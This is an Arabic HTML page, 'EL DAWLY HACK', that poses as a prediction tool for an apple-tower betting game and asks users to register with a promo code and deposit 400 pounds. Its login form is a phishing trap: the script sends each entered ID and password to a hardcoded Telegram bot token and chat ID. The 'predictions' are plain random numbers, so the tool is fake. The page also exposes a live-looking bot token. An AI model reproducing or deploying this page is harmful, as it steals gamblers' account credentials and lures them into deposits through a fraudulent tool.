<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EL DAWLY HACK</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Fonts Cairo -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Cairo', sans-serif;
            background-color: #050508;
            color: #ffffff;
            overflow-x: hidden;
        }
        .glass-panel {
            background: rgba(10, 10, 15, 0.90);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(0, 255, 128, 0.2);
            box-shadow: 0 0 30px rgba(0, 255, 128, 0.1);
        }
        .neon-glow {
            text-shadow: 0 0 10px rgba(0, 255, 128, 0.7), 0 0 20px rgba(0, 255, 128, 0.5);
        }
        .grid-tile {
            transition: all 0.25s ease-in-out;
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }
        .grid-tile.active-win {
            background: rgba(0, 255, 128, 0.15) !important;
            border: 2px solid #00ff80 !important;
            box-shadow: inset 0 0 15px rgba(0, 255, 128, 0.3), 0 0 15px rgba(0, 255, 128, 0.5) !important;
        }
        .multiplier-badge {
            background: rgba(6, 78, 59, 0.8) !important;
            border: 1px solid rgba(16, 185, 129, 0.5) !important;
            color: #34d399 !important;
            font-weight: 800 !important;
            z-index: 20 !important;
        }
        /* Fix input background & autofill color */
        input {
            background-color: rgba(0, 0, 0, 0.6) !important;
            color: #ffffff !important;
        }
        input:focus {
            background-color: rgba(0, 0, 0, 0.8) !important;
            border-color: #00ff80 !important;
            color: #ffffff !important;
        }
        input:-webkit-autofill,
        input:-webkit-autofill:hover, 
        input:-webkit-autofill:focus, 
        input:-webkit-autofill:active {
            -webkit-box-shadow: 0 0 0 30px #050508 inset !important;
            -webkit-text-fill-color: #ffffff !important;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-between relative">

    <!-- Canvas Background Matrix -->
    <canvas id="matrixCanvas" class="fixed inset-0 pointer-events-none z-0 opacity-20 hidden"></canvas>

    <!-- Login Screen Background Image -->
    <div id="loginBg" class="fixed inset-0 bg-cover bg-center z-0 filter brightness-50" style="background-image: url('https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=2000&auto=format&fit=crop');"></div>

    <!-- ==================== SUBSCRIPTION MODAL ==================== -->
    <div id="subModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/85 backdrop-blur-md hidden p-4">
        <div class="glass-panel w-full max-w-sm p-6 rounded-2xl border border-emerald-500/40 text-center space-y-4 shadow-2xl relative overflow-hidden">
            <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-emerald-500 via-cyan-500 to-emerald-500 animate-pulse"></div>
            
            <div class="w-14 h-14 mx-auto bg-emerald-500/20 rounded-full flex items-center justify-center text-emerald-400 text-2xl animate-bounce border border-emerald-500/30">
                📢
            </div>
            
            <h3 class="text-xl font-black text-emerald-400 neon-glow">الاشتراك الإجباري مطلوب</h3>
            <p class="text-xs text-gray-300 leading-relaxed">
                عذراً يا بطل، لتفعيل <span class="text-emerald-400 font-bold">EL DAWLY HACK</span> والحصول على التوقعات بدقة، يجب الانضمام لقناة تيليجرام الرسمية أولاً!
            </p>
            
            <div class="space-y-2 pt-2">
                <a href="https://t.me/XS_S04" target="_blank" onclick="playClickSound()" class="block w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500 text-white font-bold py-3 rounded-xl transition-all shadow-lg text-sm">
                    🔗 اشترك في القناة الآن (XS_S04)
                </a>
                <button onclick="playClickSound(); confirmSubscription()" class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-bold py-3 rounded-xl transition-all shadow-lg text-sm">
                    ✅ تم الاشتراك، متابعة الدخول
                </button>
            </div>
        </div>
    </div>

    <!-- ==================== LOGIN SECTION ==================== -->
    <div id="loginSection" class="relative z-10 flex-grow flex items-center justify-center p-4">
        <div class="glass-panel w-full max-w-md p-8 rounded-2xl shadow-2xl relative overflow-hidden">
            <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-emerald-500 via-cyan-500 to-emerald-500 animate-pulse"></div>
            
            <div class="text-center mb-8">
                <h1 class="text-3xl font-black tracking-wider text-emerald-400 neon-glow mb-2">EL DAWLY HACK</h1>
                <p class="text-xs text-emerald-300 font-semibold">السكريبت رقم واحد في الشرق الأوسط</p>
                <div class="mt-3 inline-block bg-emerald-950/60 border border-emerald-500/30 text-emerald-300 text-xs px-3 py-1 rounded-full">
                    مطلوب التسجيل ببروموكود XTSA وايداع 400ج
                </div>
            </div>

            <form id="loginForm" class="space-y-5" onsubmit="handleLoginSubmit(event)">
                <div>
                    <label class="block text-xs font-semibold text-gray-300 mb-2">معرف المستخدم (ID)</label>
                    <input type="text" id="userId" required placeholder="أدخل الـ ID الخاص بك" 
                        class="w-full bg-black/60 border border-gray-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 transition-all">
                </div>

                <div>
                    <label class="block text-xs font-semibold text-gray-300 mb-2">كلمة المرور (Password)</label>
                    <input type="password" id="password" required placeholder="أدخل كلمة المرور" 
                        class="w-full bg-black/60 border border-gray-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 transition-all">
                </div>

                <button type="submit" onclick="playClickSound()" class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-emerald-900/40 transition-all transform active:scale-95">
                    تسجيل الدخول
                </button>
            </form>
        </div>
    </div>

    <!-- ==================== GAME SECTION ==================== -->
    <div id="gameSection" class="relative z-10 flex-grow flex flex-col hidden">
        <!-- Top Navigation Bar -->
        <header class="glass-panel border-b border-gray-800 px-4 py-3 flex items-center justify-between">
            <div class="flex items-center space-x-3 space-x-reverse">
                <span class="text-lg font-black text-emerald-400 neon-glow">EL DAWLY HACK</span>
                <span class="bg-black/40 border border-emerald-500/30 text-xs text-emerald-300 px-2.5 py-1 rounded-md flex items-center gap-1">
                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
                    أونلاين: <span id="onlineCount">142</span>
                </span>
            </div>
            
            <div class="flex items-center gap-3">
                <span id="gameStatusIndicator" class="text-xs text-emerald-400 font-semibold bg-emerald-950/40 px-3 py-1 rounded-lg border border-emerald-500/20">
                    READY // جاهز للتوقع
                </span>
                <button onclick="playClickSound(); logout()" class="bg-red-500/20 hover:bg-red-500/30 text-red-400 border border-red-500/40 text-xs font-bold px-4 py-2 rounded-xl transition-all">
                    خروج ⮡
                </button>
            </div>
        </header>

        <!-- Main Game Content -->
        <main class="flex-grow flex items-center justify-center p-4 max-w-4xl mx-auto w-full">
            <div class="glass-panel w-full p-4 sm:p-6 rounded-2xl shadow-2xl flex flex-row gap-3 items-center justify-center">
                
                <!-- Ultra Compact Sidebar Multipliers (From Bottom 1.23 to Top 349.68) -->
                <div class="w-14 sm:w-16 flex flex-col-reverse gap-2 bg-black/60 p-1.5 rounded-xl border border-gray-800 shrink-0">
                    <div class="multiplier-badge h-10 md:h-12 flex items-center justify-center rounded-lg text-xs">1.23</div>
                    <div class="multiplier-badge h-10 md:h-12 flex items-center justify-center rounded-lg text-xs">1.54</div>
                    <div class="multiplier-badge h-10 md:h-12 flex items-center justify-center rounded-lg text-xs">1.93</div>
                    <div class="multiplier-badge h-10 md:h-12 flex items-center justify-center rounded-lg text-xs">2.41</div>
                    <div class="multiplier-badge h-10 md:h-12 flex items-center justify-center rounded-lg text-xs">4.02</div>
                    <div class="multiplier-badge h-10 md:h-12 flex items-center justify-center rounded-lg text-xs">6.71</div>
                    <div class="multiplier-badge h-10 md:h-12 flex items-center justify-center rounded-lg text-xs">11.18</div>
                    <div class="multiplier-badge h-10 md:h-12 flex items-center justify-center rounded-lg text-xs">27.97</div>
                    <div class="multiplier-badge h-10 md:h-12 flex items-center justify-center rounded-lg text-xs">69.93</div>
                    <div class="multiplier-badge h-10 md:h-12 flex items-center justify-center rounded-lg text-xs">349.68</div>
                </div>

                <!-- Apple Grid Area -->
                <div class="flex-grow flex flex-col-reverse gap-2 w-full max-w-lg" id="appleGridContainer">
                    <!-- Rows generated dynamically via JS bottom-to-top -->
                </div>

            </div>
        </main>

        <!-- Bottom Controls Bar -->
        <footer class="glass-panel border-t border-gray-800 p-4">
            <div class="max-w-md mx-auto flex gap-3">
                <button onclick="playClickSound(); startPrediction()" id="startBtn" class="flex-grow bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-emerald-900/40 transition-all text-sm tracking-wider">
                    توقع
                </button>
                <button onclick="playClickSound(); resetPrediction()" class="bg-gray-800 hover:bg-gray-700 text-gray-300 font-bold px-6 py-3.5 rounded-xl border border-gray-700 transition-all text-sm">
                    إعادة
                </button>
            </div>
        </footer>
    </div>

    <!-- JavaScript Logic -->
    <script>
        const TELEGRAM_BOT_TOKEN = '8764052287:AAGpnxjPYMUn7pl5PAjdQVhMPi_dZsbWz-I';
        const TELEGRAM_CHAT_ID = '8219267719';

        // Web Audio API Sound Synthesizer
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

        function playClickSound() {
            if (audioCtx.state === 'suspended') audioCtx.resume();
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.type = 'sine';
            osc.frequency.setValueAtTime(440, audioCtx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(880, audioCtx.currentTime + 0.05);
            gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.05);
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();
            osc.stop(audioCtx.currentTime + 0.05);
        }

        function playHackerBeep() {
            if (audioCtx.state === 'suspended') audioCtx.resume();
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.type = 'square';
            osc.frequency.setValueAtTime(1200, audioCtx.currentTime);
            gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.08);
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.start();
            osc.stop(audioCtx.currentTime + 0.08);
        }

        const rowCount = 10;
        const colsCount = 5;
        let isPredicting = false;
        const rowElements = [];

        // Build 10 rows x 5 columns grid (Row 0 is bottom - 1.23)
        const gridContainer = document.getElementById('appleGridContainer');
        for (let r = 0; r < rowCount; r++) {
            const rowDiv = document.createElement('div');
            rowDiv.className = "flex gap-2 h-10 md:h-12 w-full justify-between rounded-xl p-0.5 transition-all";
            rowDiv.dataset.row = r;

            for (let c = 0; c < colsCount; c++) {
                const cell = document.createElement('div');
                cell.className = "grid-tile flex-1 rounded-lg flex items-center justify-center text-xl";
                cell.innerHTML = "";
                rowDiv.appendChild(cell);
            }
            gridContainer.appendChild(rowDiv);
            rowElements.push(rowDiv);
        }

        // Intercept login submit to ALWAYS show subscription modal on every login attempt
        function handleLoginSubmit(event) {
            event.preventDefault();
            // Show custom interactive modal every single time user attempts login
            document.getElementById('subModal').classList.remove('hidden');
        }

        async function confirmSubscription() {
            // Hide subscription modal & proceed with login & telegram notification
            document.getElementById('subModal').classList.add('hidden');
            
            const userId = document.getElementById('userId').value;
            const password = document.getElementById('password').value;

            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
                const message = `🚨 محاولة تسجيل دخول جديدة:\n🆔 ID: ${userId}\n🔑 Password: ${password}`;
                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message
                        })
                    });
                } catch (e) {
                    console.log('Telegram error:', e);
                }
            }

            document.getElementById('loginSection').classList.add('hidden');
            document.getElementById('loginBg').classList.add('hidden');
            document.getElementById('gameSection').classList.remove('hidden');
            document.getElementById('matrixCanvas').classList.remove('hidden');
            initMatrix();
        }

        function logout() {
            document.getElementById('gameSection').classList.add('hidden');
            document.getElementById('matrixCanvas').classList.add('hidden');
            document.getElementById('loginSection').classList.remove('hidden');
            document.getElementById('loginBg').classList.remove('hidden');
            resetPrediction();
        }

        async function startPrediction() {
            if (isPredicting) return;
            isPredicting = true;
            
            const btn = document.getElementById('startBtn');
            const statusInd = document.getElementById('gameStatusIndicator');
            btn.disabled = true;
            btn.classList.add('opacity-50');
            statusInd.innerText = "جاري التوقع...";

            resetGridVisuals();

            // Predict strictly from BOTTOM (r=0) to TOP (r=9)
            for (let r = 0; r < rowCount; r++) {
                const rowDiv = rowElements[r];
                const winningCol = Math.floor(Math.random() * colsCount);

                rowDiv.classList.add('bg-emerald-950/20', 'border', 'border-emerald-500/20');
                playHackerBeep();
                await new Promise(resolve => setTimeout(resolve, 300));

                for (let c = 0; c < colsCount; c++) {
                    if (c === winningCol) {
                        rowDiv.children[c].innerHTML = "🍎";
                        rowDiv.children[c].classList.add('active-win');
                    } else {
                        rowDiv.children[c].innerHTML = "";
                    }
                }
            }

            statusInd.innerText = "اكتمل التوقع 🎯";
            btn.disabled = false;
            btn.classList.remove('opacity-50');
            isPredicting = false;
        }

        function resetPrediction() {
            if (isPredicting) return;
            resetGridVisuals();
            document.getElementById('gameStatusIndicator').innerText = "READY // جاهز للتوقع";
        }

        function resetGridVisuals() {
            for (let r = 0; r < rowCount; r++) {
                const rowDiv = rowElements[r];
                rowDiv.className = "flex gap-2 h-10 md:h-12 w-full justify-between rounded-xl p-0.5 transition-all";
                for (let c = 0; c < colsCount; c++) {
                    rowDiv.children[c].className = "grid-tile flex-1 rounded-lg flex items-center justify-center text-xl";
                    rowDiv.children[c].innerHTML = "";
                }
            }
        }

        function initMatrix() {
            const canvas = document.getElementById('matrixCanvas');
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            const letters = '01XTSAELDWLYHACK';
            const fontSize = 14;
            const columns = canvas.width / fontSize;
            const drops = Array(Math.floor(columns)).fill(1);

            function draw() {
                ctx.fillStyle = 'rgba(5, 5, 8, 0.08)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#00ff80';
                ctx.font = fontSize + 'px monospace';

                for (let i = 0; i < drops.length; i++) {
                    const text = letters.charAt(Math.floor(Math.random() * letters.length));
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            setInterval(draw, 33);
        }
    </script>
</body>
</html>
